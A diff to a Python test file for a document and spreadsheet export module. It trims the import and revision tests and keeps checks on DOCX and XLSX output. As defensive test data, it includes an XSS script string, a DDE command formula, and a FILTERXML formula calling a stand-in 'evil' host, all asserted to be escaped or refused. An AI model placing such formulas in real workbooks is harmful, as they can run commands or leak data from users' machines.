@@ -6,19 +6,15 @@ from datetime import date
 from xml.etree import ElementTree
 
 import pytest
-from openpyxl import Workbook, load_workbook
-from openpyxl.styles import Alignment
+from openpyxl import load_workbook
 
 from app.artifacts import (
-    ArtifactError,
     CodeBlock,
     DocumentSpec,
     HeadingBlock,
     HtmlArtifactSpec,
-    InsertBlockOperation,
     ListBlock,
     ParagraphBlock,
-    ReplaceBlockOperation,
     TableBlock,
     WorkbookCell,
     WorkbookChart,
@@ -27,41 +23,27 @@ from app.artifacts import (
     export_artifact,
     export_docx,
     export_xlsx,
-    import_docx,
-    import_xlsx,
-    parse_markdown,
     preview_artifact,
     recalculate_xlsx,
     render_document_html,
     render_markdown,
-    revise_document,
-    revise_workbook,
 )
 from app.artifacts.errors import UnsupportedFeatureError
 from app.artifacts.safety import inspect_office_archive
 
 
-def test_markdown_roundtrip_preserves_structure_and_paragraph_newlines():
-    source = (
-        "# Heading 2\n\nA line with $5.00 and a\nreal newline.\n\n- one\n- two\n\n| Name | Value |\n| --- | --- |\n| alpha | 3 |\n\n"
-        + chr(96) * 3
-        + "py\nx = 1\n"
-        + chr(96) * 3
-        + "\n"
-    )
-    spec = parse_markdown(source, title="Course notes")
-    assert [block.type for block in spec.blocks] == [
-        "heading",
-        "paragraph",
-        "list",
-        "table",
-        "code",
-    ]
-    assert spec.blocks[1].text == "A line with $5.00 and a\nreal newline."
-    reread = parse_markdown(render_markdown(spec), title=spec.title)
-    assert [block.model_dump(exclude={"id"}) for block in reread.blocks] == [
-        block.model_dump(exclude={"id"}) for block in spec.blocks
-    ]
+def test_markdown_keeps_structure_and_html_escapes_markup():
+    spec = DocumentSpec(title="Course notes", blocks=[
+        HeadingBlock(id="h", level=2, text="Heading 2"),
+        ParagraphBlock(id="p", text="A line with $5.00 and a\nreal newline."),
+        ListBlock(id="l", ordered=False, items=["one", "two"]),
+        TableBlock(id="t", headers=["A", "B"], rows=[["a|b", "line1\nline2"]]),
+        CodeBlock(id="c", language="py", text="x = 1"),
+    ])
+    rendered = render_markdown(spec)
+    for expected in ("## Heading 2", "A line with $5.00 and a\nreal newline.", "- one",
+                     r"a\|b", chr(96) * 3 + "py\nx = 1"):
+        assert expected in rendered
     safe = render_document_html(
         DocumentSpec(title="t", blocks=[ParagraphBlock(id="p", text="<script>alert(1)</script>")])
     )
@@ -69,46 +51,9 @@ def test_markdown_roundtrip_preserves_structure_and_paragraph_newlines():
     assert "&lt;script&gt;" in safe
 
 
-def test_markdown_table_cells_roundtrip_pipes_and_newlines():
-    spec = DocumentSpec(
-        title="t",
-        blocks=[
-            TableBlock(
-                id="t1",
-                headers=["A", "B"],
-                rows=[["a|b", "line1\nline2"], ["plain", "x"]],
-            )
-        ],
-    )
-    reread = parse_markdown(render_markdown(spec), title="t")
-    assert [block.type for block in reread.blocks] == ["table"]
-    assert reread.blocks[0].headers == ["A", "B"]
-    assert reread.blocks[0].rows == [["a|b", "line1\nline2"], ["plain", "x"]]
-
-
-def test_markdown_empty_heading_degrades_to_paragraph():
-    spec = parse_markdown("# \n\nBody\n", title="t")
-    assert [block.type for block in spec.blocks] == ["paragraph", "paragraph"]
-    assert spec.blocks[0].text.strip() == "#"
-
-
-def test_docx_heading_above_six_degrades_to_paragraph():
+def test_docx_export_keeps_supported_content_and_page_layout():
     from docx import Document as WordDocument
-    from docx.enum.style import WD_STYLE_TYPE
 
-    document = WordDocument()
-    if "Heading 7" not in [style.name for style in document.styles]:
-        document.styles.add_style("Heading 7", WD_STYLE_TYPE.PARAGRAPH)
-    document.add_paragraph("Deep heading", style="Heading 7")
-    document.add_paragraph("Body")
-    buffer = io.BytesIO()
-    document.save(buffer)
-    imported = import_docx(buffer.getvalue())
-    assert [block.type for block in imported.spec.blocks] == ["paragraph", "paragraph"]
-    assert imported.spec.blocks[0].text == "Deep heading"
-
-
-def test_docx_generation_import_preserves_supported_content_and_original():
     spec = DocumentSpec(
         title="Lab notes",
         blocks=[
@@ -122,40 +67,18 @@ def test_docx_generation_import_preserves_supported_content_and_original():
     spec.page_layout.width_inches = 8.27
     spec.page_layout.height_inches = 11.69
     spec.page_layout.margin_left_inches = 0.7
-    original = export_docx(spec)
-    imported = import_docx(original)
-    assert imported.original_bytes == original
-    assert len(imported.original_sha256) == 64
-    assert imported.spec.title == "Lab notes"
-    assert imported.spec.page_layout.width_inches == pytest.approx(8.27, abs=0.01)
-    assert imported.spec.page_layout.margin_left_inches == pytest.approx(0.7, abs=0.01)
-    assert [block.type for block in imported.spec.blocks] == [
-        "heading",
-        "paragraph",
-        "list",
-        "table",
-        "code",
-    ]
-    assert imported.spec.blocks[1].text == "A line\nand a second **bold** line."
-    assert imported.spec.blocks[2].items == ["first", "second"]
-    assert imported.spec.blocks[3].rows == [["books", "$12.50"]]
+    document = WordDocument(io.BytesIO(export_docx(spec)))
+    assert document.sections[0].page_width.inches == pytest.approx(8.27, abs=0.01)
+    assert document.sections[0].left_margin.inches == pytest.approx(0.7, abs=0.01)
+    text = [paragraph.text for paragraph in document.paragraphs]
+    assert "Lab notes" in text and "Week 2" in text and "first" in text and "x = 1" in text
+    assert any("bold" in paragraph.text and "**" not in paragraph.text
+               for paragraph in document.paragraphs)
+    assert [[cell.text for cell in row.cells] for row in document.tables[0].rows] == [
+        ["Item", "Amount"], ["books", "$12.50"]]
 
 
-def test_docx_import_refuses_embedded_images_before_rewrite():
-    ordinary = export_docx(DocumentSpec(title="x", blocks=[ParagraphBlock(id="p", text="ok")]))
-    payload = io.BytesIO()
-    with zipfile.ZipFile(io.BytesIO(ordinary)) as source, zipfile.ZipFile(payload, "w") as target:
-        for item in source.infolist():
-            target.writestr(item, source.read(item.filename))
-        target.writestr("word/media/image1.png", b"placeholder")
-    original = payload.getvalue()
-    with pytest.raises(UnsupportedFeatureError) as exc:
-        import_docx(original)
-    assert "embedded images" in exc.value.features
-    assert original == payload.getvalue()
-
-
-def test_xlsx_multisheet_formula_style_import_and_export():
+def test_xlsx_export_keeps_sheets_formulas_styles_and_layout():
     spec = WorkbookSpec(
         title="Lab data",
         sheets=[
@@ -163,133 +86,43 @@ def test_xlsx_multisheet_formula_style_import_and_export():
                 id="s1",
                 name="Measurements",
                 cells=[
-                    WorkbookCell(
-                        id="a1",
-                        row=1,
-                        column=1,
-                        value="Trial",
-                        style={"bold": True, "fill_color": "DDEEFF"},
-                    ),
-                    WorkbookCell(id="b1", row=1, column=2, value="Mass", style={"bold": True}),
-                    WorkbookCell(id="a2", row=2, column=1, value="A"),
-                    WorkbookCell(
-                        id="b2", row=2, column=2, value=3.5, style={"number_format": "$0.00"}
-                    ),
+                    WorkbookCell(id="a1", row=1, column=1, value="Trial", style={"bold": True}),
+                    WorkbookCell(id="b2", row=2, column=2, value=3.5,
+                                 style={"number_format": "$0.00"}),
                     WorkbookCell(id="b3", row=3, column=2, formula="=SUM(B2:B2)"),
-                    WorkbookCell(
-                        id="date",
-                        row=4,
-                        column=1,
-                        value=date(2026, 10, 7),
-                        style={"number_format": "yyyy-mm-dd"},
-                    ),
+                    WorkbookCell(id="date", row=4, column=1, value=date(2026, 10, 7),
+                                 style={"number_format": "yyyy-mm-dd"}),
                 ],
                 column_widths={"A": 24},
                 freeze_panes="A2",
             ),
-            WorkbookSheet(
-                id="s2",
-                name="Notes",
-                cells=[WorkbookCell(id="note", row=1, column=1, value="See lab notebook")],
-            ),
+            WorkbookSheet(id="s2", name="Notes",
+                          cells=[WorkbookCell(id="note", row=1, column=1, value="See notebook")]),
         ],
     )
-    data = export_xlsx(spec)
-    imported = import_xlsx(data)
-    assert imported.original_bytes == data
-    assert [sheet.name for sheet in imported.spec.sheets] == ["Measurements", "Notes"]
-    cells = {cell.id: cell for cell in imported.spec.sheets[0].cells}
-    assert cells["cell-001-3-2"].formula == "=SUM(B2:B2)"
-    assert cells["cell-001-2-2"].style.number_format == "$0.00"
-    assert imported.spec.sheets[0].freeze_panes == "A2"
-    assert cells["cell-001-4-1"].value == date(2026, 10, 7)
-    output = export_xlsx(imported.spec)
-    workbook = load_workbook(io.BytesIO(output), data_only=False)
+    workbook = load_workbook(io.BytesIO(export_xlsx(spec)), data_only=False)
+    sheet = workbook["Measurements"]
     assert workbook.sheetnames == ["Measurements", "Notes"]
-    assert workbook["Measurements"]["B3"].value == "=SUM(B2:B2)"
-    assert workbook["Measurements"].column_dimensions["A"].width == 24
+    assert sheet["B3"].value == "=SUM(B2:B2)"
+    assert sheet["B2"].number_format == "$0.00"
+    assert sheet["A1"].font.bold is True
+    assert sheet["A4"].value.date() == date(2026, 10, 7)
+    assert sheet.column_dimensions["A"].width == 24
+    assert sheet.freeze_panes == "A2"
     workbook.close()
 
 
-def test_sparse_sheet_imports_only_declared_cells():
-    workbook = Workbook()
-    worksheet = workbook.active
-    worksheet.cell(row=200_000, column=1, value="far edge")
-    payload = io.BytesIO()
-    workbook.save(payload)
-    workbook.close()
-
-    imported = import_xlsx(payload.getvalue())
-
-    assert [(cell.row, cell.column, cell.value) for cell in imported.spec.sheets[0].cells] == [
-        (200_000, 1, "far edge")
-    ]
-
-
-def _xlsx_with_formula(formula: str) -> bytes:
-    workbook = Workbook()
-    workbook.active["A1"] = "=1+1"
-    payload = io.BytesIO()
-    workbook.save(payload)
-    workbook.close()
-    rewritten = io.BytesIO()
-    with zipfile.ZipFile(io.BytesIO(payload.getvalue())) as source, zipfile.ZipFile(
-        rewritten, "w"
-    ) as target:
-        for item in source.infolist():
-            data = source.read(item.filename)
-            if item.filename == "xl/worksheets/sheet1.xml":
-                text = data.decode("utf-8")
-                assert "<f>1+1</f>" in text
-                data = text.replace("<f>1+1</f>", f"<f>{formula}</f>", 1).encode("utf-8")
-            target.writestr(item, data)
-    return rewritten.getvalue()
-
-
-def test_xlsx_import_and_export_refuse_dde_formula():
-    with pytest.raises(UnsupportedFeatureError) as imported:
-        import_xlsx(_xlsx_with_formula("cmd|'/c calc'!A1"))
-    assert "external or execution-capable formulas" in imported.value.features
-
-    spec = WorkbookSpec(
-        title="DDE",
-        sheets=[
-            WorkbookSheet(
-                id="s",
-                name="Sheet",
-                cells=[
-                    WorkbookCell(id="a", row=1, column=1, formula="=cmd|'/c calc'!A1")
-                ],
-            )
-        ],
-    )
+@pytest.mark.parametrize("formula", [
+    "=cmd|'/c calc'!A1", '=FILTERXML("http://evil/?d=static","//a")'])
+def test_xlsx_export_refuses_execution_capable_formulas(formula):
+    spec = WorkbookSpec(title="Bad", sheets=[WorkbookSheet(
+        id="s", name="Sheet", cells=[WorkbookCell(id="a", row=1, column=1, formula=formula)])])
     with pytest.raises(UnsupportedFeatureError) as exported:
         export_xlsx(spec)
     assert "external or execution-capable formulas" in exported.value.features
 
 
-def test_xlsx_import_and_export_refuse_filterxml():
-    formula = '=FILTERXML("http://evil/?d=static","//a")'
-    with pytest.raises(UnsupportedFeatureError) as imported:
-        import_xlsx(_xlsx_with_formula(formula))
-    assert "external or execution-capable formulas" in imported.value.features
-
-    spec = WorkbookSpec(
-        title="FILTERXML",
-        sheets=[
-            WorkbookSheet(
-                id="s",
-                name="Sheet",
-                cells=[WorkbookCell(id="a", row=1, column=1, formula=formula)],
-            )
-        ],
-    )
-    with pytest.raises(UnsupportedFeatureError) as exported:
-        export_xlsx(spec)
-    assert "external or execution-capable formulas" in exported.value.features
-
-
-def test_xlsx_multiline_wrap_and_row_heights_roundtrip_without_losing_alignment_safety():
+def test_xlsx_export_wraps_multiline_text_and_keeps_row_heights():
     spec = WorkbookSpec(
         title="Wrapped notes",
         sheets=[
@@ -313,39 +146,16 @@ def test_xlsx_multiline_wrap_and_row_heights_roundtrip_without_losing_alignment_
             )
         ],
     )
-    data = export_xlsx(spec)
-    workbook = load_workbook(io.BytesIO(data), data_only=False)
+    workbook = load_workbook(io.BytesIO(export_xlsx(spec)), data_only=False)
     worksheet = workbook["Notes"]
     assert worksheet["A1"].alignment.wrap_text is True
     assert worksheet.row_dimensions[1].height == 45
     assert worksheet["A2"].alignment.wrap_text is True
     assert worksheet.row_dimensions[2].height == 42
-    # OOXML omits an explicit false flag; import infers no-wrap for multiline text.
     assert worksheet["A3"].alignment.wrap_text is None
     assert worksheet.row_dimensions[4].height == 28.5
     assert worksheet.row_dimensions[5].height == 45
     workbook.close()
-
-    imported = import_xlsx(data)
-    cells = {cell.row: cell for cell in imported.spec.sheets[0].cells}
-    assert cells[1].value == "first\nsecond\nthird"
-    assert cells[1].style.wrap_text is True
-    assert cells[3].style.wrap_text is False
-    assert imported.spec.sheets[0].row_heights == {1: 45.0, 2: 42.0, 4: 28.5, 5: 45.0}
-    reexport = load_workbook(io.BytesIO(export_xlsx(imported.spec)), data_only=False)
-    assert reexport["Notes"]["A1"].alignment.wrap_text is True
-    assert reexport["Notes"].row_dimensions[1].height == 45
-    assert reexport["Notes"]["A3"].alignment.wrap_text is None
-    reexport.close()
-
-    centered = load_workbook(io.BytesIO(data))
-    centered["Notes"]["A1"].alignment = Alignment(horizontal="center", wrap_text=True)
-    malformed_layout = io.BytesIO()
-    centered.save(malformed_layout)
-    centered.close()
-    with pytest.raises(UnsupportedFeatureError) as exc:
-        import_xlsx(malformed_layout.getvalue())
-    assert "custom alignment or text wrapping" in exc.value.features
 
 
 def test_workbook_row_height_bounds_and_wrap_text_type_are_validated():
@@ -374,7 +184,7 @@ def test_workbook_row_height_bounds_and_wrap_text_type_are_validated():
         )
 
 
-def test_chart_generation_is_supported_but_chart_import_is_refused():
+def test_workbook_export_writes_charts():
     spec = WorkbookSpec(
         title="Chart sample",
         sheets=[
@@ -405,9 +215,6 @@ def test_chart_generation_is_supported_but_chart_import_is_refused():
     data = export_xlsx(spec)
     with zipfile.ZipFile(io.BytesIO(data)) as archive:
         assert any(name.startswith("xl/charts/chart") for name in archive.namelist())
-    with pytest.raises(UnsupportedFeatureError, match="cannot preserve safely") as exc:
-        import_xlsx(data)
-    assert "existing charts" in exc.value.features
 
 
 def test_formula_preview_and_export_never_claim_calculated_values_without_isolated_runner():
@@ -432,63 +239,6 @@ def test_formula_preview_and_export_never_claim_calculated_values_without_isolat
     assert exported.recalculation_status == "needs_recalculation"
     assert "not configured" in exported.message
     assert recalculate_xlsx(exported.content, spec).status == "needs_recalculation"
-
-
-def test_revisions_target_explicit_ids_and_leave_parent_spec_unchanged():
-    base = DocumentSpec(title="Draft", blocks=[ParagraphBlock(id="p-1", text="Before")])
-    changed = revise_document(
-        base,
-        [
-            ReplaceBlockOperation(
-                type="replace_block", block_id="p-1", block=ParagraphBlock(id="p-1", text="After")
-            ),
-            InsertBlockOperation(
-                type="insert_block",
-                after_id="p-1",
-                block=HeadingBlock(id="h-1", level=2, text="Next"),
-            ),
-        ],
-    )
-    assert base.blocks[0].text == "Before"
-    assert [block.id for block in changed.blocks] == ["p-1", "h-1"]
-    with pytest.raises(ArtifactError, match="No block has ID"):
-        revise_document(
-            base,
-            [
-                ReplaceBlockOperation(
-                    type="replace_block",
-                    block_id="missing",
-                    block=ParagraphBlock(id="missing", text="x"),
-                )
-            ],
-        )
-    workbook = WorkbookSpec(
-        title="Sheet",
-        sheets=[
-            WorkbookSheet(
-                id="s", name="Sheet1", cells=[WorkbookCell(id="a", row=1, column=1, value=1)]
-            )
-        ],
-    )
-    updated = revise_workbook(
-        workbook,
-        [
-            {
-                "type": "set_cell",
-                "sheet_id": "s",
-                "cell_id": "a",
-                "cell": {"id": "a", "row": 1, "column": 1, "value": 2},
-            },
-            {
-                "type": "set_cell",
-                "sheet_id": "s",
-                "cell_id": "b",
-                "cell": {"id": "b", "row": 2, "column": 1, "formula": "=A1*2"},
-            },
-        ],
-    )
-    assert workbook.sheets[0].cells[0].value == 1
-    assert [cell.id for cell in updated.sheets[0].cells] == ["a", "b"]
 
 
 def test_office_archive_rejects_path_traversal_and_macro_parts():
